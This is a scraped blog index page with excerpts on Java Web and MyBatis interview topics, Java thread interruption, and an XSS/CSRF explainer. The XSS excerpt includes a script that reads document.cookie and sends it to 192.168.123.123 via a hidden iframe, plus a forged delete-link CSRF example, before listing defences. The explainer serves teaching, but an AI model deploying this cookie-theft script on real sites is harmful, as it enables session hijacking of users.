<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Email: tonganhao1103@gmail.com"><meta name="keywords" content=""><meta name="author" content="Toyan"><meta name="copyright" content="Toyan"><title>ToyanのBlog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?c61658fe357dc669ee95b5bd4e25caad";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();</script><link rel="dns-prefetch" href="http://ta.qq.com"><script>(function() {
   var hm = document.createElement("script");
   hm.src = "https://tajs.qq.com/stats?sId=66513922";
   var s = document.getElementsByTagName("script")[0];
   s.parentNode.insertBefore(hm, s);
 })();</script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="ToyanのBlog" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/public/avatar.jpeg"></div><div class="author-info__name text-center">Toyan</div><div class="author-info__description text-center">Email: tonganhao1103@gmail.com</div><div class="follow-button"><a href="https://github.com/toyan-blog" target="_blank" rel="noopener">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">17</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">14</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">20</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://molunerfinn.com/hexo-theme-melody-doc/" target="_blank" rel="noopener">hexo-theme-melody</a><a class="author-info-links__name text-center" href="https://molunerfinn.com/" target="_blank" rel="noopener">Molunerfinn</a></div></div></div><nav id="nav" style="background-image: url(https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/public/blog.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">ToyanのBlog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="site-info"><div id="site-title">ToyanのBlog</div><div id="site-sub-title"></div><div id="site-social-icons"><a class="social-icon" href="https://github.com/toyan-blog" target="_blank" rel="noreferrer noopener nofollow"><i class="fa-github fa"></i></a><a class="social-icon" href="https://weibo.com/3889572163" target="_blank" rel="noreferrer noopener nofollow"><i class="fa-weibo fa"></i></a><a class="social-icon" href="https://toyan.top/atom.xml" target="_blank" rel="noreferrer noopener nofollow"><i class="fa-rss fa"></i></a></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/java-web-summary/">Java Web总结</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-08-13</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/">基础知识总结</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/Java-Web/">Java Web</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Java/">Java</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Java-Web/">Java Web</a></span><div class="content"> JSP与Servlet的区别

 Servlet的生命周期

前三个方法与Servlet的生命周期相关，Web容器加载Servlet并将其实例化之后，Servlet的生命周期开始，容器运行其init()方法进行Servlet的初始化；请求到达时调用Servlet的service()方法，service()方法根据需要调用与请求相对应的doGet()或doPost()方法；当服务器关闭或项目被卸载时服务器会将Servlet实例销毁，此时会调用destroy()方法
 如何保持会话状态，有哪些方式，区别如何？

URL重写：在URL中添加用户会话的信息作为请求的参数，或者将唯一的会话ID添加到URL结尾以表示一个会话
设置表单隐藏域：将和会话跟踪相关的字段添加到隐藏表单域中，这些信息不回在浏览器中显示但是在提交表单时会提交给服务器

以上两种方式都比较难以处理跨越多个页面的信息传递，因为如果每次都要修改URL或者在页面添加隐藏表单域来存储用户会话相关的信息，会变得比较复杂。
HTML5中可以使用Web Storage技术通过JavaScript来保持数据，例如可以使用localStorage和sessionStorage来保存用户会话的信息，它能够实现会话跟踪
 cookie和session的区别
由于http协议是无状态的协议，所以服务端需要记录用户的状态时，就需要用某种机制来识具体的用户，这个机制就是session。这个session是保存在服务端的，有一个唯一标识。在服务端保存session的方法有很多，内存、数据库、文件都可以。
每次http请求的时候，客户端都会发送相应的cookie信息到服务端，实际上大多数的应用都是用cookie来实现session跟踪的，第一次创建session的时候，服务端会在http协议中告诉客户端，需要在cookie里面记录一个session id，以后每次请求把这个会话id发送到服务器。
如果客户端浏览器禁用了cookie，在这种情况下，会使用一种叫做URL重写的技术来进行会话跟踪，即每次http请求，URL后面都会附上一个诸如sid=xxx这样的参数，服务端据此来标识用户。
总结：Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中；Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。
 Spring IOC和AOP


Spring IOC
IOC叫控制反转，是Inversion of Control的缩写，DI(Dependency Injection)叫依赖注入，是对IOC更简单的诠释。**控制反转是把传统上由程序代码直接操控的对象调用权交给容器，通过容器来实现对象组件的装配和管理。所谓的控制反转就是对组件对象控制权的转移，从程序代码本身转移到了外部容器，由容器来创建并管理对象之间的依赖关系。**DI是对IOC更准确的描述，即组件之间的依赖关系由容器在运行期间决定，形象的来说，即由容器动态的将某种依赖关系注入到组件之中。
举个例子：类A需要用到接口B中的方法，那么就需要类A与接口B建立关联或者依赖关系，最原始的方法就在在类A创建接口B的实现类C的实例，但**这种方法要求开发人员自行维护两者的依赖关系，即当依赖关系需要改变的时候需要修改代码并重新构建整个系统。**如果通过一个容器来管理这些对象的依赖关系，只需要在类A中定义好用于管理接口B的方法（构造器或者setter方法），将类A与接口B的实现类C放入容器，通过对容器的配置来实现两者的关系。



Spring AOP
AOP(Aspect-Oriented Programming)指一种程序设计范式，该范式以一种称为切面（aspect）的语言构造为基础，**切面是一种新的模块化机制，用来描述分散在对象、类或方法中的横切关注点。**通常，事务、日志、安全性等关注就是应用中的横切关注功能。



IOC容器的加载过程

创建IOC配置文件的抽象资源
创建一个BeanFactory
把读取配置信息的BeanDefinitionReader，这里是XmlBeanDefinitionReader配置给BeanFactory
把定义好的资源位置读入配置信息，具体解析过程有XmlBeanDefinitionReader来完成，这样完成整个载入bean定义的过程



动态代理与cglib实现的区别

JDK动态代理只能对实现了接口的类生成代理，而不能针对类
CGLIB是针对类实现代理，主要是对指定的类生成了一个子类，覆盖其中的方法。因为是继承，所以该类或方法最好不要声明成final
JDK代理是不需要第三方库，只要JDK环境就可以进行代理
CGLib必须依赖于CGLib的类库，但是它需要类来实现任何接口代理的是指定的类生成一个子类，覆盖其中的方法，是一种继承



 Spring MVC的原理

Spring MVC主要由DispatcherServlet、处理器映射、处理器（控制器）、视图解析器、视图组成。两个核心是：

**处理器映射：**选择使用哪个控制器来处理请求
**视图解析器：**选择结果应该如何渲染

通过以上两点，Spring MVC保证了如何选择控制处理请求和如何选择视图展现输出之间的松耦合。

 Mybatis


#{}和${}的区别是什么？
 1234#&#123;&#125;是预编译处理，$&#123;&#125;是字符串替换Mybatis在处理#&#123;&#125;时，会将sql中的#&#123;&#125;替换为?号，调用PreparedStatement的set方法来赋值Mybatis在处理$&#123;&#125;时，就是把$&#123;&#125;替换成变量的值使用#&#123;&#125;可以有效的防止SQL注入，提高系统安全性


当实体类中的属性名和表中字段名不一样，怎么办？
 1234第一种：通过在查询的sql语句中定义字段名的别名，让字段名的别名和实体类的属性名一致&lt;select id="selectorder" paramaterType="int" resultType="me.gacl.domain.order"&gt;  select order_id id, order_no orderno, order_price price from orders where order_id=#&#123;id&#125;;&lt;/select&gt;
 1234567891011第二种：通过&lt;resultMap&gt;来映射字段名和实体类属性名的一一对应的关系&lt;select id="getOrder" parameterType="int" resultType="orderResultMap"&gt;  select * from orders where order_id=#&#123;id&#125;;&lt;/select&gt;&lt;resultMap type="me.gacl.domain.order" id="orderResultMap"&gt;  &lt;!-用id属性来映射主键字段-&gt;  &lt;id property="id" column="order_id"&gt;  &lt;!-用result属性来映射非主键字段，property为实体类属性名，column为数据表中的属性-&gt;  &lt;result property="orderno" column="order_no"/&gt;  &lt;result property="price" column="order_price"/&gt;&lt;/resultMap&gt;


模糊查询like语句该怎么写？
 1234567第一种：在Java代码中添加sql通配符String wildCardName = "%smi%";list&lt;name&gt; names = mapper.selectlike(wildCardName);&lt;select id = "selectlike"&gt;  select * from foo where bar like #&#123;value&#125;&lt;/select&gt;
 1234567第2种：在sql语句中拼接通配符，会引起sql注入String wildCardName = "smi";list&lt;name&gt; names = mapper.selectlike(wildCardName);&lt;select id="selectlike"&gt;  select * from foo where bar like "%"#&#123;value&#125;"%"&lt;/select&gt;
 12345第3种：使用动态SQL语句，OGNL表达式中的bind标签&lt;select id="selectEmployLikeName" resultType="org.fkit.domain.Employee"&gt;  &lt;bind name="pattern" value="'%' + _parameter.getName() + '%'" /&gt;  select * from tb_employee where loginname like #&#123;pattern&#125;&lt;/select&gt;
 1234567891011// 根据传入的参数进行模糊查询List&lt;Employee&gt; selectEmployeeLikeName(Employee employee);public void test(SqlSession session) &#123;  EmployeeMapper em = session.getMapper(EmployeeMapper.class);  Employee employee = new Employee();  // 设置模糊查询的参数  employee.setName("o");  List&lt;Employee&gt; list = em.selectEmployeeLikeName(employee);  System.out.println(list);&#125;


通常一个xml映射文件，都会写一个Dao接口与之对应，请问，这个Dao接口的工作原理是什么？Dao接口里的方法，参数不同时，方法能重载吗？
答：Dao接口，就是人们通常说的Mapper接口，接口的全限名，就是映射文件中的namespace的值，接口的方法名，就是映射文件中MappedStatement的id值，就是传递给sql的参数。Mapper接口没有实现类，当调用接口方法时，接口全限名+方法名拼接字符串作为key值，可唯一定位一个MappedStatement，举例：
 1com.mybatis3.mappers.StudentDao.findStudentById，可以唯一找到namespace为com.mybatis3.mappers.StudentDao下面id = findStudentById的MappedStatement。在Mybatis中，每一个&lt;select&gt;、&lt;insert&gt;、&lt;update&gt;、&lt;delete&gt;标签，都会被解析为一个MappedStatement对象
Dao接口里的方法，是不能重载的，因为是全限名+方法名的保存和寻找策略。
Dao接口的工作原理是JDK动态代理，Mybatis运行时会使用JDK动态代理为Dao接口生成代理proxy对象，代理对象proxy会拦截方法接口，转而执行MappedStatement所代表的sql，然后将sql执行结果返回。


Mybatis是如何将sql执行结果封装成目标对象并返回的？都有哪些映射形式？
答：第一种是使用标签，逐一定义列名和对象属性名之间的映射关系；第二种是使用sql列的别名功能，将列别名书写为对象属性名，比如T_NAME AS NAME，对象属性名一般是name，小写，但是列名不区分大小写，Mybatis会忽略列名大小写，智能找到与之对应对象属性名，甚至可以写成T_NAME AS NaMe，Mybatis一样可以正常工作。
有了列名与属性名的映射关系后，Mybatis通过反射创建对象，同时使用反射给对象的属性逐一赋值并返回，那些找不到映射关系的属性，是无法完成赋值的。


Mybatis是如何进行分页的？分页插件的原理是什么？
答：Mybatis使用RowBounds对象进行分页，它是针对ResultSet结果集执行的内存分页，而非物理分页，可以在sql内直接书写带有物理分页的参数来完成物理分页功能，也可以使用分页插件来完成物理分页。
分页插件的基本原理是使用Mybatis提供的插件接口，实现自定义插件，在插件的拦截方法内拦截待执行的sql，然后重写sql，根据dialect方言，添加对应的物理分页语句和物理分页参数。


如何执行批量插入？
首先，创建一个简单的insert语句：
 123&lt;insert id="insertname"&gt;  insert into names (name) values (#&#123;value&#125;)&lt;/insert&gt;
然后在Java代码中像下面这样执行批处理插入。
 1234567891011121314151617List&lt;string&gt; names = new ArrayList&lt;&gt;(); names.add(“fred”); names.add(“barney”); names.add(“betty”); names.add(“wilma”); // 注意这里 executortype.batch sqlsession sqlsession = sqlsessionfactory.opensession(executortype.batch); try &#123;   namemapper mapper = sqlsession.getmapper(namemapper.class);   for (string name : names) &#123;     mapper.insertname(name);   &#125;   sqlsession.commit(); &#125; finally &#123;   sqlsession.close(); &#125;


如何获取自动生成的（主）键值？
答：insert方法总是返回一个int值，这个值代表的是插入的行数。而自动生成的键值在insert方法执行完后可以被设置到传入的参数对象中。示例：
 12345678910&lt;insert id="insertname" useGeneratedkeys="true" keyProperty="id"&gt;  insert into name (name) values (#&#123;name&#125;)&lt;/insert&gt;name name = new name();name.setName("fred");int rows = mapper.insertname(name);System.out.println("row inserted=" + rows);System.out.println("generated key value=" + name.getId());


在mapper中如何传递多个参数？
第一种：
 1234567# Dao层的函数public selectUser(String name, String area);# 对应的xml，#&#123;0&#125;代表接收的是dao层的第一个参数，#&#123;1&#125;代表dao层中第二个参数，更多参数一致往后即可。&lt;select id="selectUser" resultMap="BaseResultMap"&gt;  select * from user_user_t where user_name=#&#123;0&#125; and user_area=#&#123;1&#125;&lt;/select&gt;
第二种：
 123456789# 使用@param注解import org.apache.ibatis.annotations.param;public interface userMapper(user selectUser(@param("userName") String userName, @param("hashedPassword") String hashedPassword));# 然后就可以在xml像下面这样使用（推荐封装为一个map，作为单个参数传递个mapper）&lt;select id="selectUser" resultType="user"&gt;  select id, username, hashedPassword from some_table where userName=#&#123;userName&#125; and hashedPassword=#&#123;hashedPassword&#125;&lt;/select&gt;


Mybatis动态sql是做什么？都有哪些动态sql？能简述一下动态sql的执行原理不？
答：Mybatis的动态sql可以让我们在xml映射文件内，以标签形式编写动态sql，完成逻辑判断和动态拼接sql的功能。
Mybatis提供了9种动态sql标签：trim|where|set|foreach|if|choose|when|otherwise|bind
其执行原理为，使用OGNL从sql参数对象中计算表达式的值，根据表达式的值动态拼接sql，以此来完成动态sql的功能。


Mybatis的xml映射文件中，不同的xml映射文件，id是否可以重复？
答：不同的xml映射文件，如果配置了namespace，那么id可以重复；如果没有配置namespace，那么id不能重复；毕竟namespace不是必须的，只是最佳实践而已。
原因就是namespace+id是作为Map&lt;String, MappedStatement&gt;的key使用的，如果没有namespace，就剩下id，那么，id重复会导致数据相互覆盖。有了namespace，自然id就可以重复，namespace不同，namespace+id自然也就不同。


为什么说Mybatis是半自动的ORM映射工具？它与全自动的区别在哪里？
答：Hibernate属于全自动ORM映射工具，使用Hibernate查询关联对象或者关联集合对象时，可以根据对象关系模型直接获取，所以它是全自动的。
Mybatis在查询关联对象或关联集合对象时，需要手动编写sql来完成，所以，称之为半自动ORM映射工具。


一对一、一对多的关联查询？
1234567891011121314151617181920212223242526272829303132&lt;mapper namespace="com.lcb.mapping.userMapper"&gt;  &lt;!--association 一对一关联查询--&gt;  &lt;select id="getClass" parameterType="int" resultMap="ClassesResultMap"&gt;    select * from class c, teacher t where c.teacher_id=t.id and c.c_id=#&#123;id&#125;  &lt;/select&gt;  &lt;resultMap type="com.lcb.user.Classes" id="ClassesResultMap"&gt;    &lt;!--实体类的字段名和数据表的字段名映射--&gt;    &lt;id property="id" column="c_id"/&gt;    &lt;result property="name" column="c_name"/&gt;    &lt;association property="teacher" javaType="com.lcb.user.Teacher"&gt;      &lt;id property="name" column="t_id"/&gt;      &lt;result property="name" column="t_name"&gt;    &lt;/association&gt;  &lt;/resultMap&gt;  &lt;!--collection 一对多关联查询--&gt;  &lt;select id="getClass2" parameter="int" resultMap="ClassesResultMap2"&gt;    select * from class c, teacher t, student s where c.teacher_id=t.t_id and c.c_id=s.class_id and c.c_id=#&#123;id&#125;  &lt;/select&gt;  &lt;resultMap type="com.lcb.user.Classes" id="ClassesResultMap2"&gt;    &lt;id property="id" column="c_id"/&gt;    &lt;result property="name" column="c_name"/&gt;    &lt;association property="teacher" javaType="com.lcb.user.Teacher"&gt;      &lt;id property="id" column="t_id"/&gt;      &lt;result property="name" column="t_name"/&gt;    &lt;/association&gt;    &lt;collection property="student" ofType="com.lcb.user.Student"&gt;      &lt;id property="id" column="s_id"/&gt;      &lt;result property="name" column="s_name"/&gt;    &lt;/collection&gt;  &lt;/resultMap&gt;&lt;/mapper&gt;


</div><a class="more" href="/java-web-summary/#more" style="margin-top: 14px">Read more</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/xss-and-csrf/">XSS与CSRF</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-08-11</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/Web/">Web</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/Web/%E5%89%8D%E7%AB%AF/">前端</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E5%89%8D%E7%AB%AF/">前端</a></span><div class="content">以下内容全部来自于转载
 XSS和CSRF的介绍
XSS：通过客户端脚本语言（最常见是JavaScript）在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那就叫做XSS！
CSRF：又称XSRF，冒充用户发起请求（在用户不知情的情况下）完成一些违背用户意愿的请求（如恶意发帖、删帖、改密码、发邮件等）。
通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。
XSS更偏向与代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。
场景：我在一条帖子里面写下了如下代码，发了出去，然后陆陆续续有很多可爱（wu / zhi） 的用户访问到这个帖子，然后用户接下来的所有操作都由我这串代码掌控了。
123while(true)&#123;    alert('你关不掉我');&#125;
这个就是最原始的脚本注入了。用户进来就麻烦了，一直弹窗一直弹窗。
那么XSS（跨站脚本）就是照瓢画葫了，用JavaScript写一个请求跨站的脚本就是XSS了，如下：
123456789101112131415// 用 &lt;script type="text/javascript"&gt;&lt;/script&gt; 包起来放在评论中(function(window, document) &#123;    // 构造泄露信息用的 URL    var cookies = document.cookie;    var xssURIBase = "http://192.168.123.123/myxss/";    var xssURI = xssURIBase + window.encodeURI(cookies);    // 建立隐藏 iframe 用于通讯    var hideFrame = document.createElement("iframe");    hideFrame.height = 0;    hideFrame.width = 0;    hideFrame.style.display = "none";    hideFrame.src = xssURI;    // 开工    document.body.appendChild(hideFrame);&#125;)(window, document);
此段代码携带着cookie信息传输给了不安全的服务器，然后服务器接受到了用户的隐私消息，继而继续做其他的业务处理。
这里tips一下：上面的代码仅仅是XSS，并没有发生CSRF，因为192.168.123.123/myxss/index.php 仅仅是把用户信息存起来了而已，他并没有“伪造”用户发起一些请求，所以他只算是XSS攻击而不算是CSRF攻击，如果192.168.123.123/myxss/index.php 写的代码是 将当前用户的昵称改为“我是大笨猪”，那么就算是CSRF攻击了，因为这段代码伪造用户发出了请求（但是用户却不自知）。
那么下面我介绍一下最最简单的CSRF攻击（没有用到XSS的哦）：
一个论坛，经过我的多次抓包分析（着重分析请求返回头，请求返回体）了解到这个论坛的删帖操作是触发 csdnblog.com/bbs/delete_article.php?id=“X&quot; 那么，我只需要在论坛中发一帖，包含一链接：www.csdnblog.com/bbs/delete_article.php?id=“X&quot; ，只要有用户点击了这个链接，那么ID为X的这一篇文章就被删掉了，而且是用户完全不知情的情况（敲黑板状：此处我可没有写XSS脚本哦，我纯粹是发一个url地址出来而已，既然删除操作可以伪造，那么只要我细细分析，其他操作（发帖，改名字，发私信，只要是这个论坛具有的功能）我都可以伪造咯！
 XSS与CSRF的防范
CSRF依赖于XSS，防住XSS基本也就防住了CSRF让我们明确我们的目的，其实就是不让用户踏入XSS的坑，那我们有两个方法防止用户入坑，一个是对外部输入进行彻彻底底的敏感字符过滤，一个是在显示的时候做一些特殊处理不让敏感代码顺利执行。前者主要由前端与后端合力完成，后者的话通常就是由前端单独去完成的。
理论上只要有输入数据入口的地方，XSS漏洞就会存在，js代码可以由各种各样的模式注入到数据库中（明文或者编码），所以在中小项目中我们先明确一个意识即可，我们开发人员要有安全处理的意识，不求百分百的过滤掉非法字符，但是基本的，常见的过滤掉即可，剩下的就交给安全工程师去做吧。
中心思想：一切的一切外部来源数据，毕竟经过我们服务端代码的过滤，才能让他展示到页面上，也就是说，一切外部数据都是非法的，一定要做好过滤，尤其是WEB端。（毕竟各种js防不胜防）。
通用的补充性防御手段


在输出html时，加上Content Security Policy的Http Header
作用：可以防止页面被XSS攻击时，嵌入第三方的脚本文件等
缺陷：IE或低版本的浏览器可能不支持


在设置Cookie时，加上HttpOnly参数
作用：可以防止页面被XSS攻击时，Cookie信息被盗取，可兼容至IE6
缺陷：网站本身的JS代码也无法操作Cookie，而且作用有限，只能保证Cookie的安全


在开发API时，检验请求的Referer参数
作用：可以在一定程度上防止CSRF攻击
缺陷：IE或低版本的浏览器中，Referer参数可以被伪造


</div><a class="more" href="/xss-and-csrf/#more" style="margin-top: 14px">Read more</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/java-concurrent-summary/">并发编程总结</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-03-25</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/">基础知识总结</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/">并发编程</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Java/">Java</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/">并发编程</a></span><div class="content"> 可重入内置锁
同一个线程在调用本类中其他synchronized方法/块或父类中的synchronized方法/块时，都不会阻碍该线程地执行，因为互斥锁时可重入的。
 中断线程
 使用interrupt()中断线程
当一个线程运行时，另一个线程可以调用对应的Thread对象的interrupt()方法中断它。该方法只是在目标线程中设置了一个标志位，表示它已经被中断，并立即返回。如果只是单纯的调用interrupt()方法，线程并没有实际中断，会继续执行。
12345678910111213141516171819202122232425262728293031public class SleepInterrupt extends Object implements Runnable&#123;    public void run() &#123;        try &#123;            System.out.println("in run() - about to sleep for 20 seconds");            Thread.sleep(20000);            System.out.println("in run() - woke up");        &#125; catch(InterruptedException e) &#123;            System.out.println("in run() - interrupted while sleeping");            //处理完中断异常后，返回到run（）方法人口，            //如果没有return，线程不会实际被中断，它会继续打印下面的信息            return;          &#125;        System.out.println("in run() - leaving normally");    &#125;     public static void main(String[] args) &#123;        SleepInterrupt si = new SleepInterrupt();        Thread t = new Thread(si);        t.start();        //主线程休眠2秒，从而确保刚才启动的线程有机会执行一段时间        try &#123;            Thread.sleep(2000);         &#125; catch(InterruptedException e) &#123;            e.printStackTrace();        &#125;        System.out.println("in main() - interrupting other thread");        //中断线程t        t.interrupt();        System.out.println("in main() - leaving");    &#125;&#125;
运行结果：

主线程启动新线程后，自身休眠2秒钟，允许新线程获得运行时间。新线程打印信息“about to sleep for 20 seconds”后，继而休眠20秒钟，大约2秒钟后，main线程通知新线程中断，那么新线程的20秒的休眠将被打断，从而抛出InterruptException异常，执行跳转到catch块，打印出“interrupted while sleeping”信息，并立即从run（）方法返回，然后消亡，而不会打印出catch块后面的“leaving normally”信息。
注意：如果将catch块中的return语句注释掉，则线程在抛出异常后，会继续执行，而不会中断，从而打印出”leaving normally“信息。
 待决中断
上面的例子中断是在sleep()方法之后调用的，它会相当友好地终止线程，并抛出InterruptedException异常。如果在调用sleep()方法前被中断，则该中断被称为待决中断，它会在调用sleep()方法时，立即出InterruptedException异常。
123456789101112131415161718public class PendingInterrupt extends Object &#123;    public static void main(String[] args) &#123;        //如果输入了参数，则在mian线程中中断当前线程（亦即main线程）        if (args.length &gt; 0 ) &#123;            Thread.currentThread().interrupt();        &#125;         //获取当前时间        long startTime = System.currentTimeMillis();        try &#123;            Thread.sleep(2000);            System.out.println("was NOT interrupted");        &#125; catch (InterruptedException x) &#123;            System.out.println("was interrupted");        &#125;        //计算中间代码执行的时间        System.out.println("elapsedTime=" + (System.currentTimeMillis() - startTime));    &#125;&#125;
执行结果如下：

 使用isInterrupted()方法判断中断状态
可以在Thread对象上调用isInterrupted()方法来检查任何线程的中断状态。这里需要注意：线程一旦被中断，isInterrupted()方法便会返回true，而一旦sleep()方法抛出异常，它将清空中断标志，此时isInterrupted()方法将返回false。
12345678910111213141516171819public class InterruptCheck extends Object &#123;    public static void main(String[] args) &#123;        Thread t = Thread.currentThread();        System.out.println("Point A: t.isInterrupted()=" + t.isInterrupted());        //待决中断，中断自身        t.interrupt();        System.out.println("Point B: t.isInterrupted()=" + t.isInterrupted());        System.out.println("Point C: t.isInterrupted()=" + t.isInterrupted());         try &#123;            Thread.sleep(2000);            System.out.println("was NOT interrupted");        &#125; catch ( InterruptedException x) &#123;            System.out.println("was interrupted");        &#125;        //抛出异常后，会清除中断标志，这里会返回false        System.out.println("Point D: t.isInterrupted()=" + t.isInterrupted());    &#125;&#125;
运行结果如下：

 使用Thread.interrupted()方法判断中断标志位
可以使用Thread.interrupted()方法来检查当前线程的中断状态(并隐式重置为false)，由于该方法是静态方法，因此不能在特定的线程下使用，而只能报告调用它的线程的中断状态，如果线程被中断，而且中断状态尚不清楚，那么，这个方法返回true。与isInterrupted()不同，它将自动重置中断状态为false，第二次调用Thread.interrupted()方法，总是返回false，除非中断了线程。
1234567891011public class InterruptReset extends Object &#123;    public static void main(String[] args) &#123;        System.out.println(            "Point X: Thread.interrupted()=" + Thread.interrupted());        Thread.currentThread().interrupt();        System.out.println(            "Point Y: Thread.interrupted()=" + Thread.interrupted());        System.out.println(            "Point Z: Thread.interrupted()=" + Thread.interrupted());    &#125;&#125;
运行结果如下：

补充：

join()方法用线程对象调用，如果一个线程A中调用另一个线程B的join方法，线程A会等待线程B执行完毕后再执行。
yield方法直接使用Thread类调用，yield让出CPU执行权限，再重新竞争CPU的执行权，如果没有比它优先级高的线程，则依旧不会有变化。

 线程挂起、恢复与终止的方法
Java并发编程（3）：线程挂起、恢复与终止的正确方法（含代码）
 守护线程与线程阻塞


守护线程
注意：

setDaemon(true)必须在调用线程的start()方法之前设置，否则会跑出IllegalThreadStateException异常。
在守护线程中产生的新线程也是守护线程。
不要认为所有的应用都可以分配给守护线程来进行服务，比如读写操作或者计算逻辑。



线程阻塞



注意：不是所有的阻塞都是可中断的，以上阻塞状态的前两种可中断，后面两张不可以中断。
 volatile变量修饰符
Java语言规范中指出：为了获得最佳速度，允许线程保存共享成员变量的私有拷贝，而且只当线程进入或者离开同步代码块时才将私有拷贝与共享内存中的原始值进行比较。这样当多个线程同时与某个对象交互时，就必须注意到要让线程及时的得到共享成员变量的变化。而volatile关键字就是提示JVM：对于这个成员变量，不能保存它的私有拷贝，而应直接与共享成员变量交互。
volatile是一种稍弱的同步机制，在访问volatile变量时不会执行加锁操作，也就不会执行线程阻塞，因此volatilei变量是一种比synchronized关键字更轻量级的同步机制。
